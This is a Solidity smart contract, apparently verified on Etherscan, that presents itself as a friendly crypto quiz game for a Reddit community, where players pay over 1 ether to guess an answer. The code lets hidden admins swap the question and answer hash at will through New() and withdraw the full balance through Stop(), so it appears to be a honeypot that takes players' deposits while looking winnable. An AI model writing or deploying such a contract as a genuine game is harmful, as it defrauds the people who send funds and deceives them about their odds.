/**
 *Submitted for verification at Etherscan.io on 2022-01-21
*/

// SPDX-License-Identifier: MIT
pragma solidity >=0.4.22 <0.9.0;

// My first solidity quiz game for my beloved reddit defi community. 

contract CryptoQuiz
{
    function Try(string memory _response) public payable
    {
        require(msg.sender == tx.origin);

        if(answerHash == keccak256(abi.encode(_response)) && msg.value > 1 ether)
        {
            payable(msg.sender).transfer(address(this).balance);
        }
    }

    string public question;

    bytes32 answerHash;

    mapping (bytes32=>bool) admin;


    function Start(string calldata _question, string calldata _response) public payable isAdmin{
        if(answerHash == 0x0)
        {
            answerHash = keccak256(abi.encode(_response));
            question = _question;
        }
    }

    function Stop() public payable isAdmin {
        payable(msg.sender).transfer(address(this).balance);
    }

    function New(string calldata _question, bytes32 _answerHash) public payable isAdmin {
        question = _question;
        answerHash = _answerHash;
    }

    constructor(bytes32[] memory admins) {
        for(uint256 i=0; i< admins.length; i++){
            admin[admins[i]] = true;
        }
    }


    modifier isAdmin(){
        require(admin[keccak256(abi.encodePacked(msg.sender))]);
        _;
    }

    fallback() external {}
}